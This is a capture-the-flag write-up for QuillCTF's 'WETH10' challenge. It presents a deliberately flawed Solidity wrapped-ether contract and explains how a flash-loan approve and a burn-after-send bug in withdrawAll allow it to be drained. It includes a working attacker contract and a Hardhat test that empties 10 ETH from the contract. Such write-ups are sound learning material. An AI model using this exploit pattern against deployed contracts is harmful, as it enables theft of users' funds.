# QuillCTF: 9. WETH10

> Tired of WETH9, we created an overall better version of the commonly used contract,
> providing a trustless, immutable, and standardized way for smart contracts to abstract
> away the difference between the native ETH asset and fungible ERC-20 tokens.
> We call it WETH10, the Messi Wrapped Ether.
>
> The contract currently has 10 ethers.

**Objective of CTF:**

- Your job is to rescue all the funds from the contract, starting with 1 ether, in only one transaction.

**Target contract:**

```solidity
pragma solidity ^0.8.0;

import {ERC20} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import {ReentrancyGuard} from "@openzeppelin/contracts/security/ReentrancyGuard.sol";
import {Address} from "@openzeppelin/contracts/utils/Address.sol";

// The Messi Wrapped Ether
contract WETH10 is ERC20("Messi Wrapped Ether", "WETH10"), ReentrancyGuard {
  receive() external payable {
    deposit();
  }

  function _burnAll() internal {
    _burn(msg.sender, balanceOf(msg.sender));
  }

  function deposit() public payable nonReentrant {
    _mint(msg.sender, msg.value);
  }

  function withdraw(uint256 wad) external nonReentrant {
    Address.sendValue(payable(msg.sender), wad);
    _burn(msg.sender, wad);
  }

  function withdrawAll() external nonReentrant {
    Address.sendValue(payable(msg.sender), balanceOf(msg.sender));
    _burnAll();
  }

  /// @notice Request a flash loan in ETH
  function execute(address receiver, uint256 amount, bytes calldata data) external nonReentrant {
    uint256 prevBalance = address(this).balance;
    Address.functionCallWithValue(receiver, data, amount);

    require(address(this).balance >= prevBalance, "flash loan not returned");
  }
}
```

## The Attack

In this challenge, it first feels like we should do something with the flash loan. However, most of the functions are re-entrancy guarded, so we can't really get into them from within the loan. However, the loan logic itself allows us to call anything!

So, first we can have infinite allowance by making the contract itself call `approve` from within the loan, approving us a lot of tokens.

The real trick is in the second one, which is related to actually draining the funds. Let us examine the withdraw functions:

- `withdraw` takes an amount, and sends it as value to the caller, and burns that same amount from the WETH10.
- `withdrawAll` seems like it is doing a `withdraw(<your-balance>)` but it is not! At the burning step, it just burns your remaining token balance at that point! So, if you could somehow secure your tokens elsewhere right after receiving your withdrawals, but right before the burning takes place; then, you can retrieve those tokens later to keep withdrawing!

That is exactly what we will do. We first start with 1 ETH, so we can draw 1 ETH for free. Then, we can draw 2 ETH, and then 4 ETH and so on, until we drain the contract.

## Proof of Concept

Our attacker contract, acting as Bob here, is written as follows:

```solidity
contract WETH10Attacker {
  WETH10 immutable weth10;
  address immutable target;
  address immutable bob;

  bool ispwning;

  constructor(address targetAddress) {
    weth10 = WETH10(payable(targetAddress));
    bob = address(this);
    target = targetAddress;
  }

  function min(uint256 a, uint256 b) internal pure returns (uint256) {
    if (a < b) {
      return a;
    }
    return b;
  }

  function pwn() external {
    // take 0-amount flash loan, approving many many tokens to the user
    weth10.execute(target, 0, abi.encodeWithSignature("approve(address,uint256)", [uint256(uint160(bob)), 9999 ether]));

    while (target.balance != 0) {
      // commence attack with min(yourBalance, targetBalance)
      uint256 amount = min(bob.balance, target.balance);

      // deposit WETH
      weth10.deposit{value: amount}();

      // withdraw WETH, will enter `receive`
      ispwning = true;
      weth10.withdrawAll();
      ispwning = false;

      // transferFrom back your WETH10
      weth10.transferFrom(target, bob, amount);

      // withdraw for real to get extra ETH for your WETH10
      weth10.withdrawAll();
    }
  }

  receive() external payable {
    if (ispwning) {
      // send WETH10 back to the pool, before burning happens
      weth10.transfer(target, msg.value);
    }
  }
}
```

A Hardhat proof-of-concept test is written as follows (in compliance with the setup described in Foundry):

```ts
describe('QuillCTF: 9. WETH10', () => {
  let owner: SignerWithAddress;
  let attacker: SignerWithAddress;

  let contract: WETH10;
  let bob: WETH10Attacker;

  const CONTRACT_INITIAL_BALANCE = ethers.utils.parseEther('10');
  const BOB_INITIAL_BALANCE = ethers.utils.parseEther('1');

  before(async () => {
    [owner, attacker] = await ethers.getSigners();
    contract = await ethers.getContractFactory('WETH10', owner).then(f => f.deploy());
    await contract.deployed();

    // weth contract should have 10 ether
    await ethers.provider.send('hardhat_setBalance', [contract.address, '0x8ac7230489e80000']);
    expect(await ethers.provider.getBalance(contract.address)).to.eq(CONTRACT_INITIAL_BALANCE);
  });

  it('should rescue funds', async () => {
    bob = await ethers.getContractFactory('WETH10Attacker', attacker).then(f => f.deploy(contract.address));
    await bob.deployed();

    // bob should have 1 ether
    await ethers.provider.send('hardhat_setBalance', [bob.address, '0xde0b6b3a7640000']);
    expect(await ethers.provider.getBalance(bob.address)).to.eq(BOB_INITIAL_BALANCE);

    // pwn
    await bob.pwn();
  });

  after(async () => {
    // empty weth contract
    expect(await ethers.provider.getBalance(contract.address)).to.eq(0);

    // bob balance should be 11 ETH
    expect(await ethers.provider.getBalance(bob.address)).to.eq(ethers.utils.parseEther('11'));
  });
});
```
